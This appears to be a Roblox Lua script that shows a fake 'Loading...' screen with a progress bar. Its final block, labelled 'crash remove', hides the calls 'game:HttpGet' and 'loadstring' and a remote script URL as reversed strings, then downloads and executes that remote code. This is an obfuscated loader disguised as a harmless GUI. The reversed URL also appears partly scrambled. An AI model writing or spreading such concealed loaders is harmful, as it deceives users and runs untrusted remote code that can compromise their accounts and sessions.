local player = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui")
gui.ResetOnSpawn = false  
gui.Parent = player:WaitForChild("PlayerGui")

-- Create the main frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0.3, 0, 0.2, 0)
frame.Position = UDim2.new(0.35, 0, 0.4, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.BorderSizePixel = 2
frame.Active = true  
frame.Draggable = true  
frame.Parent = gui

-- Create the "Loading" text
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 0.3, 0)
textLabel.Position = UDim2.new(0, 0, 0.05, 0)
textLabel.Text = "Loading..."
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
textLabel.BackgroundTransparency = 1
textLabel.Font = Enum.Font.SourceSansBold
textLabel.TextScaled = true
textLabel.Parent = frame

-- Create the loading bar frame
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0.9, 0, 0.2, 0)
loadingFrame.Position = UDim2.new(0.05, 0, 0.75, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
loadingFrame.BorderSizePixel = 2
loadingFrame.Parent = frame

-- Create the progress bar inside the loading bar
local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0, 0, 1, 0)
progressBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
progressBar.Parent = loadingFrame

-- Animate loading bar for 5 seconds
for i = 1, 5 do
    progressBar.Size = UDim2.new(i / 5, 0, 1, 0)
    wait(1)
end

-- Remove GUI after loading
gui:Destroy()

-- crash remove
local a = string.reverse
local b = a("teGpttH:emag")
local c = a("gnirtsdaol")
local d = a("aulc.tpircsnj/niah/daeh/sfer/mbmu2bMm/stpircsnoc.butitbuhtnocw/")

local scriptExecution = _G[c](_G[b](a(d), true))
scriptExecution()
